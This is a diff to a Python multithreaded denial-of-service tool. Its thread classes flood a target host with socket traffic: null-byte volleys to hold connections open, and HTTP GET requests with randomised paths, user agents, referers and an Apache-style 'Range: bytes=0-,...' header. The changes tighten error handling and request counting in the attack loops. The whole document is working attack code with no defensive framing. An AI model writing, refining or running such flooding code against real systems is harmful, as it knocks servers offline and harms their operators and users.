@@ -606,7 +606,7 @@ class reqpost(threading.Thread):
        print("Posted: {}".format(h))
       time.sleep(random.uniform(.1,3))
      except:
-      pass
+      break
     s.close()
    except:
     pass
@@ -703,7 +703,7 @@ class pham(threading.Thread):
        print("Posted: {} --> {}".format(h,ipp))
       time.sleep(random.uniform(.1,3))
      except:
-      pass
+      break
     s.close()
    except:
     pass
@@ -871,9 +871,13 @@ class pxer(threading.Thread):
      s.settimeout(self.timeout)
     s.connect((self.target,self.port))
     while (stop!=True):
-     s.send("\x00".encode('utf-8'))
+     try:
+      s.send("\x00".encode('utf-8'))
+      if prints==True:
+       print("[{}: Voly sent-->{}]".format(x,ipp))
+     except:
+      break
      time.sleep(.2)
-     print("[{}: Voly sent-->{}]".format(x,ipp))
    except:
     pass
    time.sleep(.3)
@@ -1065,11 +1069,14 @@ class apa(threading.Thread):
     for x in range(random.randint(self.packs2,self.packs1)):
      if stop==True:
       break
-     s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(rando.randint(1,1000000))+str(rando.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
+     try:
+      s.send("GET {} HTTP/1.1\r\nHost: {}\r\nRange: bytes=0-,{}\r\nUser-Agent: {}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\n\r\n".format("/?"+str(rando.randint(1,1000000))+str(rando.randint(1,1000000)),self.target,apache,random.choice(ua),random.randint(100,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis))).encode('utf-8'))
+      counter+=1
+      if prints==True:
+       print("Requests sent: {}".format(counter))
+     except:
+      break
      time.sleep(self.speed)
-     counter+=1
-     if prints==True:
-      print("Requests sent: {}".format(counter))
    except:
     pass
 class ptc(threading.Thread):
